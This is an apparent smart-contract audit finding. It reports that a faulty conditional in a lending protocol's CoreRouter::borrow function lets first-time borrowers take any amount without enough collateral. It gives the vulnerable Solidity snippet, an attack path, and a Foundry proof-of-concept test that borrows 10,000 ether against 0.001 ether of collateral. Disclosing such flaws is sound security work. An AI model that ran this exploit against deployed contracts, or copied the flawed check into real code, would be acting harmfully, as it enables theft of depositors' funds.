# Any rando can steal all supplied funds due to faulty conditional in `CoreRouter::borrow` function

### Summary

In the `CoreRouter` contract `borrow` function a vulnerability exists which allows users to borrow virtually any amount of tokens(as long as they're available) when they borrow assets for the first time. The issue comes from improper validation when checking if a user has sufficient collateral, where first-time borrows of any amount for any asset is allowed regardless of the user's collateral level.
```solidity
uint256 borrowAmount = currentBorrow.borrowIndex != 0
    ? ((borrowed * LTokenInterface(_lToken).borrowIndex()) / currentBorrow.borrowIndex)
    : 0;

require(collateral >= borrowAmount, "Insufficient collateral"); 
```
When the `currentBorrow.borrowIndex != 0` condition is false, the `borrowAmount` is always set to 0 regardless of the actual borrowed amount. This is bad as the `currentBorrow.borrowIndex` is only particular to the current `lToken` asset being borrowed. This means that so long as the user has some supplied lTokens and hasn't borrowed a particular asset before (i.e the `borrowIndex` is equal to 0), they will automatically be allowed to borrow any amount of the `lToken` asset.



### Root Cause

In [borrow](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L157) the condition that sets `borrowAmount` is faulty as when it is false, it always allows any amount of the passed in lToken to be borrowed regardless of the user's supplied collateral

### Internal Pre-conditions

NIL

### External Pre-conditions

NIL

### Attack Path

- A user supplies 1000 USDC
- Rando supplies 10 USDC of collateral and calls borrow with 100 USDC as parameters
- Taking a `collateralFactor` of 0.75, the function gets the rando available collateral which is 0.75 * 10 USDC = 7.5 USDC
- `currentBorrow.borrowIndex` = 0 for USDC lToken
- `borrowAmount` is calculated as 0
- Collateral check passes: 7.5 >= 0
- Rando is allowed to borrow that amount and can repeat for all allowed supply tokens

### Impact

Any rando can steal all available supplied funds

### PoC

Add the following test function to `TestBorrowing.t.sol`
```solidity
function testUserCanStealFunds() public {
        address user = makeAddr("user");
        address token = supportedTokens[0];

        vm.startPrank(deployer);
        //deployer supplies 100_000 ether, enough for user to borrow
        ERC20Mock(token).mint(deployer, 1e23);
        IERC20(token).approve(address(coreRouter), 1e23);
        coreRouter.supply(1e23, token);
        vm.stopPrank();

        vm.startPrank(user);
        //user supplies 0.001 ether
        ERC20Mock(token).mint(user, 1e15);
        IERC20(token).approve(address(coreRouter), 1e15);
        coreRouter.supply(1e15, token);

        //user borrows 10_000 ether
        coreRouter.borrow(1e22, token);
        vm.stopPrank();
    }
```
